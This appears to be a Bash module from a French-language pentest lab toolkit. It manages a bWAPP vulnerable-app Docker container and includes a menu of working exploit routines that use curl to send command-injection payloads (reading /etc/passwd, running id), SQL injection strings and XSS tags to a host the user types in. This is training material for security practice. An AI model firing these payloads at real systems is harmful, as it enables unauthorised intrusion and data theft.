#!/bin/bash
source ~/ghost00ls/lib/colors.sh
source ~/ghost00ls/lib/banner.sh

MODULE_DIR=~/ghost00ls/modules/labs/bwapp
LOG_DIR=~/ghost00ls/logs/labs
LOG_FILE="$LOG_DIR/bwapp.log"
CONTAINER_NAME=bwapp
DOCKER_IMAGE=raesene/bwapp
BWAPP_PORT=8084

mkdir -p "$LOG_DIR"

# ==========================
# Vérifications
# ==========================
check_docker() {
    if ! command -v docker &>/dev/null; then
        echo -e "${RED}❌ Docker n'est pas installé${NC}"
        return 1
    fi
    return 0
}

# ==========================
# Fonctions de gestion
# ==========================

start_bwapp() {
    echo -e "${YELLOW}⏳ Démarrage bWAPP...${NC}" | tee -a "$LOG_FILE"
    
    if ! check_docker; then
        read -p "👉 Entrée pour revenir..."
        return
    fi
    
    # Vérifier si déjà en cours
    if docker ps --format '{{.Names}}' | grep -q "^$CONTAINER_NAME$"; then
        echo -e "${YELLOW}⚠️ bWAPP est déjà en cours d'exécution${NC}"
        read -p "👉 Entrée pour revenir..."
        return
    fi
    
    sudo docker run -d --rm --name "$CONTAINER_NAME" \
        -p "${BWAPP_PORT}:80" "$DOCKER_IMAGE" >>"$LOG_FILE" 2>&1
    
    if [ $? -eq 0 ]; then
        local IP=$(hostname -I | awk '{print $1}')
        echo -e "${GREEN}✅ bWAPP lancé : http://$IP:${BWAPP_PORT}${NC}" | tee -a "$LOG_FILE"
        echo -e "${CYAN}👤 Login : bee / bug${NC}"
    else
        echo -e "${RED}❌ Échec du démarrage${NC}" | tee -a "$LOG_FILE"
    fi
    
    read -p "👉 Entrée pour revenir..."
}

stop_bwapp() {
    echo -e "${YELLOW}⏳ Arrêt bWAPP...${NC}" | tee -a "$LOG_FILE"
    
    if docker ps -a --format '{{.Names}}' | grep -q "^$CONTAINER_NAME$"; then
        sudo docker stop "$CONTAINER_NAME" >>"$LOG_FILE" 2>&1
        echo -e "${GREEN}✅ bWAPP stoppé${NC}" | tee -a "$LOG_FILE"
    else
        echo -e "${YELLOW}⚠️ Aucun container bWAPP trouvé${NC}"
    fi
    
    sleep 1
}

clean_bwapp() {
    echo -e "${YELLOW}⏳ Nettoyage bWAPP...${NC}" | tee -a "$LOG_FILE"
    sudo docker rm -f "$CONTAINER_NAME" >>"$LOG_FILE" 2>&1
    echo -e "${GREEN}✅ bWAPP nettoyé${NC}" | tee -a "$LOG_FILE"
    sleep 1
}

status_bwapp() {
    echo -e "${CYAN}📊 Statut bWAPP :${NC}"
    
    if docker ps --format '{{.Names}}' | grep -q "^$CONTAINER_NAME$"; then
        echo -e "${GREEN}running (container: $CONTAINER_NAME)${NC}"
        local IP=$(hostname -I | awk '{print $1}')
        echo -e "URL : http://$IP:${BWAPP_PORT}"
    else
        echo -e "${YELLOW}stopped${NC}"
    fi
    
    read -p "👉 Entrée pour revenir..."
}

show_logs() {
    echo -e "${YELLOW}📜 Logs bWAPP (50 dernières lignes)${NC}"
    
    if docker ps -a --format '{{.Names}}' | grep -q "^$CONTAINER_NAME$"; then
        sudo docker logs --tail 50 "$CONTAINER_NAME"
    else
        tail -n 50 "$LOG_FILE" 2>/dev/null || echo -e "${YELLOW}(Pas de logs disponibles)${NC}"
    fi
    
    read -p "👉 Entrée pour revenir..."
}

show_info() {
    clear
    banner
    echo -e "${CYAN}=== 📋 Informations bWAPP ===${NC}"
    echo
    local IP=$(hostname -I | awk '{print $1}')
    echo -e "${GREEN}🔗 URL : http://$IP:${BWAPP_PORT}${NC}"
    echo -e "${GREEN}🔌 Port : ${BWAPP_PORT}${NC}"
    echo -e "${GREEN}👤 Login : bee${NC}"
    echo -e "${GREEN}🔑 Password : bug${NC}"
    echo -e "${GREEN}🐳 Container : ${CONTAINER_NAME}${NC}"
    echo
    echo -e "${CYAN}📚 Vulnérabilités disponibles :${NC}"
    echo "   • SQL Injection (GET/POST/Search)"
    echo "   • XSS (Reflected/Stored)"
    echo "   • CSRF"
    echo "   • Command Injection"
    echo "   • LFI/RFI"
    echo "   • XXE"
    echo "   • Broken Authentication"
    echo "   • Insecure File Upload"
    echo
    read -p "👉 Entrée pour revenir..."
}

# ==========================
# Exploits inline
# ==========================

exploit_cmdinj() {
    clear; banner
    echo -e "${MAGENTA}🧪 [bWAPP - Command Injection]${NC}"
    
    source ~/ghost00ls/lib/exploits_common.sh
    
    local IP PORT BASE
    IP=$(get_host_ip)
    read -p "🌐 Host/IP ($IP): " input; IP=${input:-$IP}
    read -p "🔌 Port (${BWAPP_PORT}): " PORT; PORT=${PORT:-$BWAPP_PORT}
    BASE="http://$IP:$PORT"
    
    local payloads=(
        "127.0.0.1; id"
        "127.0.0.1 && whoami"
        "127.0.0.1 | cat /etc/passwd"
    )
    
    echo -e "${YELLOW}▶ Testing command injection...${NC}"
    
    for payload in "${payloads[@]}"; do
        local enc=$(urlenc "$payload")
        local url="${BASE}/commandi.php?target=${enc}&form=submit"
        
        echo -e "${CYAN}Payload: $payload${NC}"
        
        local resp=$(curl -s -L --max-time 10 -b "PHPSESSID=test; security_level=0" "$url")
        
        if echo "$resp" | grep -E "uid=|root:" >/dev/null 2>&1; then
            echo -e "${GREEN}✅ Command Injection SUCCESS${NC}"
            echo "$resp" | grep -A5 "uid="
            break
        else
            echo -e "${YELLOW}⚠️ No command execution detected${NC}"
        fi
    done
    
    read -p "👉 Entrée pour revenir..."
}

exploit_sqli() {
    clear; banner
    echo -e "${MAGENTA}🧪 [bWAPP - SQL Injection]${NC}"
    
    source ~/ghost00ls/lib/exploits_common.sh
    
    local IP PORT BASE
    IP=$(get_host_ip)
    read -p "🌐 Host/IP ($IP): " input; IP=${input:-$IP}
    read -p "🔌 Port (${BWAPP_PORT}): " PORT; PORT=${PORT:-$BWAPP_PORT}
    BASE="http://$IP:$PORT"
    
    local payloads=(
        "1' OR '1'='1"
        "1' UNION SELECT NULL, user(), database()--"
        "1' AND 1=1--"
    )
    
    echo -e "${YELLOW}▶ Testing SQL Injection...${NC}"
    
    for payload in "${payloads[@]}"; do
        local enc=$(urlenc "$payload")
        local url="${BASE}/sqli_1.php?title=${enc}&action=search"
        
        echo -e "${CYAN}Payload: $payload${NC}"
        
        local resp=$(curl -s -L --max-time 10 -b "PHPSESSID=test; security_level=0" "$url")
        
        if echo "$resp" | grep -iE "mysql_fetch|database|root@" >/dev/null 2>&1; then
            echo -e "${GREEN}✅ SQLi SUCCESS${NC}"
        else
            echo -e "${YELLOW}⚠️ No obvious SQLi${NC}"
        fi
    done
    
    read -p "👉 Entrée pour revenir..."
}

exploit_xss() {
    clear; banner
    echo -e "${MAGENTA}🧪 [bWAPP - XSS]${NC}"
    
    source ~/ghost00ls/lib/exploits_common.sh
    
    local IP PORT BASE
    IP=$(get_host_ip)
    read -p "🌐 Host/IP ($IP): " input; IP=${input:-$IP}
    read -p "🔌 Port (${BWAPP_PORT}): " PORT; PORT=${PORT:-$BWAPP_PORT}
    BASE="http://$IP:$PORT"
    
    local payloads=(
        "<script>alert('XSS')</script>"
        "<img src=x onerror=alert('XSS')>"
    )
    
    echo -e "${YELLOW}▶ Testing XSS...${NC}"
    
    for payload in "${payloads[@]}"; do
        local enc=$(urlenc "$payload")
        local url="${BASE}/xss_get.php?firstname=${enc}&lastname=test&form=submit"
        
        echo -e "${CYAN}Payload: $payload${NC}"
        
        local resp=$(curl -s -L --max-time 10 -b "PHPSESSID=test; security_level=0" "$url")
        
        if echo "$resp" | grep -F "$payload" >/dev/null 2>&1; then
            echo -e "${GREEN}✅ XSS reflected${NC}"
        else
            echo -e "${YELLOW}⚠️ Not reflected${NC}"
        fi
    done
    
    read -p "👉 Entrée pour revenir..."
}

# ==========================
# Menu exploits
# ==========================

menu_exploits() {
    while true; do
        clear; banner
        echo -e "${CYAN}=== 💣 Exemples d'exploitation bWAPP ===${NC}"
        echo
        echo -e "${GREEN}1) Command Injection${NC}"
        echo -e "${GREEN}2) SQL Injection${NC}"
        echo -e "${GREEN}3) XSS (Reflected)${NC}"
        echo -e "${RED}0) Retour${NC}"
        echo
        read -p "👉 Choix : " choice

        case $choice in
            1) exploit_cmdinj ;;
            2) exploit_sqli ;;
            3) exploit_xss ;;
            0) return ;;
            *) echo -e "${RED}❌ Option invalide${NC}"; sleep 1 ;;
        esac
    done
}

# ==========================
# Menu principal
# ==========================

menu_bwapp() {
    while true; do
        clear
        banner
        echo -e "${CYAN}=== 🐝 bWAPP (Buggy Web App) ===${NC}"
        echo
        echo -e "${GREEN}1) 🚀 Lancer bWAPP${NC}"
        echo -e "${GREEN}2) 📊 Statut${NC}"
        echo -e "${GREEN}3) 📋 Infos connexion${NC}"
        echo -e "${YELLOW}4) 📂 Logs bWAPP${NC}"
        echo -e "${RED}5) 🛑 Stopper bWAPP${NC}"
        echo -e "${RED}6) 🧹 Nettoyer bWAPP${NC}"
        echo -e "${CYAN}7) 💣 Exemples d'exploitation${NC}"
        echo -e "${RED}0) ❌ Retour${NC}"
        echo
        read -p "👉 Choix : " choice

        case $choice in
            1) start_bwapp ;;
            2) status_bwapp ;;
            3) show_info ;;
            4) show_logs ;;
            5) stop_bwapp ;;
            6) clean_bwapp ;;
            7) menu_exploits ;;
            0) break ;;
            *) echo -e "${RED}❌ Option invalide${NC}"; sleep 1 ;;
        esac
    done
}

# Lancement si exécuté directement
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    menu_bwapp
fi
